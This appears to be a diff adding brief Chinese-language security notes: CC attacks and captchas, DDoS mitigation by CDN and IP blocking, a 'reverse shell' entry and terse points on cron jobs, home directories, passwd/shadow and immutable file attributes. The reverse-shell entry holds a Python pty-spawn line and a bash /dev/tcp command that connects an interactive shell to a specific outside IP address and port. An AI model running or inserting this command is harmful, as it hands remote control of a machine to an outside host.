@@ -1,0 +1,7 @@
+
+cc攻击：验证码
+ddos：流量攻击，cdn，封ip
+反弹：python -c 'import pty; pty.spawn("/bin/bash")'
+         exec 9<> /dev/tcp/207.148.84.102/8008;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;^Mno
+
+计划任务    家目录     passwd/shadow   --- i权限
